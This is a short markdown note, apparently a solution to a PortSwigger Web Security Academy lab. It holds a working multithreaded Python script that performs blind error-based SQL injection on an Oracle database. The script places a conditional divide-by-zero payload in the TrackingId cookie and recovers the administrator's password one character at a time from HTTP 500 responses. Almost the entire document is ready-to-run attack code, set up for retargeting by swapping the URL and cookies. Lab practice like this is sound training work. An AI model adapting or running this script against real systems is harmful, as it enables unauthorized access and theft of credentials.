# Blind Error Based SQL Injection - MultiThreading

***Error Based Blind SQL Injection - MultiThreading***

Must Change Variables - `URL / Session / TrackingId`

Oracle Database

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor
import time

def multiThreading():
    
    ts = time.perf_counter()
    session = requests.Session()
    
    url = "https://0a4600de04a8635f803f1228001700d0.web-security-academy.net/"
    chars = string.digits + string.ascii_letters
    index = list(range(1,21))
    password = ""

    def Threads(wordlist):
        for char in chars:
            cookies = {
                "session": "9BicGeczMUlNGIL4B9tU4rDQ74oNpqzP",
                "TrackingId": f"xyz' AND (SELECT (CASE WHEN (SUBSTR(password,{wordlist},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END) FROM users WHERE username='administrator')='a"
            }
            req = session.get(url, cookies=cookies, timeout=10)
            if req.status_code == 500:
                return char
        return ""

    with ThreadPoolExecutor(max_workers=50) as executor:
        processes = executor.map(Threads,index)

    
    password = ''.join(processes)

    te = time.perf_counter()

    print(f"[+] Password extracted: {password}")
    print(f"[+] Time taken: {te - ts:.2f} seconds")

multiThreading()
```